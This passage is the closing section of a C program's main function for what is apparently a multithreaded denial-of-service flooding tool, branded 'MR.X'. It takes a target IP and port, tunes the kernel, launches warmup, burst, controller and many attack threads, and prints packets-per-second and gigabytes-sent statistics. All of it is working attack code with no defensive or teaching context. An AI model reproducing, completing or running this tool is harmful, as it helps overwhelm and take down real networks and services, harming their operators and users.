    if (ACTIVE_FLOOD_SOCKETS > 500) ACTIVE_FLOOD_SOCKETS = 500;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(TARGET_PORT);
    if (inet_pton(AF_INET, TARGET_IP, &target_addr.sin_addr) <= 0) {
        printf("Invalid IP address: %s\n", TARGET_IP);
        return 1;
    }
    printf("\n🔥 MR.X FATHER OF TG 🔥\n\n");
    printf("🎯 Target: %s:%d\n", TARGET_IP, TARGET_PORT);
    printf("⏰ Time: %d | 📦 Packet: %d\n", ATTACK_TIME, PACKET_SIZE);
    printf("👥 Threads: %d\n\n", THREAD_COUNT);
    struct timeval tv;
    gettimeofday(&tv, NULL);
    srand(tv.tv_usec ^ getpid() ^ ((unsigned int)time(NULL) << 16));
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    optimize_kernel();
    atomic_store(&total_packets, 0);
    atomic_store(&total_bytes, 0);
    atomic_store(&current_pps, 0);
    atomic_store(&peak_pps, 0);
    atomic_store(&stop_signal, 0);
    atomic_store(&should_attack, 0);
    atomic_store(&attack_seconds, 0);
    atomic_store(&total_elapsed, 0);
    atomic_store(&sync_counter, 0);
    atomic_store(&threads_ready, 0);
    atomic_store(&instant_burst_done, 0);
    atomic_store(&boost_trigger, 0);
    atomic_store(&total_attack_time, 0);
    atomic_store(&warmup_complete, 0);
    atomic_store(&warmup_phase, 0);
    atomic_store(&current_pattern, 0);
    atomic_store(&pattern_change_counter, 0);
    atomic_store(&burst_multiplier, 10);
    atomic_store(&warmup_packets_sent, 0);
    atomic_store(&instant_burst_packets_sent, 0);
    pthread_t warmup_controller_thread;
    pthread_create(&warmup_controller_thread, NULL, warmup_controller, NULL);
    int direct_thread_id = 999999;
    pthread_t direct_thread;
    if (pthread_create(&direct_thread, NULL, direct_attack, &direct_thread_id) != 0) {
        atomic_store(&stop_signal, 1);
        pthread_join(warmup_controller_thread, NULL);
        return 1;
    }
    pthread_t *threads = malloc(THREAD_COUNT * sizeof(pthread_t));
    int *tids = malloc(THREAD_COUNT * sizeof(int));
    if (!threads || !tids) {
        atomic_store(&stop_signal, 1);
        pthread_join(warmup_controller_thread, NULL);
        pthread_join(direct_thread, NULL);
        free(threads);
        free(tids);
        return 1;
    }
    for (int i = 0; i < THREAD_COUNT; i++) tids[i] = -1;
    for (int i = 0; i < THREAD_COUNT; i++) {
        tids[i] = i;
        if (pthread_create(&threads[i], NULL, attack_thread, &tids[i]) != 0) {
            tids[i] = -1;
        }
        usleep(200 + (i % 10) * 30);
    }
    pthread_t controller_thread;
    pthread_create(&controller_thread, NULL, attack_controller, NULL);
    pthread_t monitor_thread;
    pthread_create(&monitor_thread, NULL, stats_monitor, NULL);
    pthread_join(warmup_controller_thread, NULL);
    pthread_join(direct_thread, NULL);
    pthread_join(controller_thread, NULL);
    for (int i = 0; i < THREAD_COUNT; i++) if (tids[i] != -1) pthread_join(threads[i], NULL);
    pthread_join(monitor_thread, NULL);
    int elapsed = atomic_load(&attack_seconds);
    unsigned long long total_p = atomic_load(&total_packets);
    unsigned long long total_b = atomic_load(&total_bytes);
    unsigned long long warmup_p = atomic_load(&warmup_packets_sent);
    unsigned long long burst_p = atomic_load(&instant_burst_packets_sent);
    if (elapsed > 0) {
        double avg_pps = total_p / (double)elapsed;
        double total_gb = total_b / (1024.0 * 1024.0 * 1024.0);
        printf("\n🚀 MR.X NEVER END 🚀\n\n");
        printf("✅ Total Packets: %llu\n", total_p);
        printf("🔥 Warm-up Packets: %llu\n", warmup_p);
        printf("💥 Burst Packets: %llu\n", burst_p);
        printf("🚀 AVERAGE PPS: %.0fK\n", avg_pps/1000);
        printf("💾 Total Data: %.2fGB\n", total_gb);
    }
    free(threads);
    free(tids);
    return 0;
}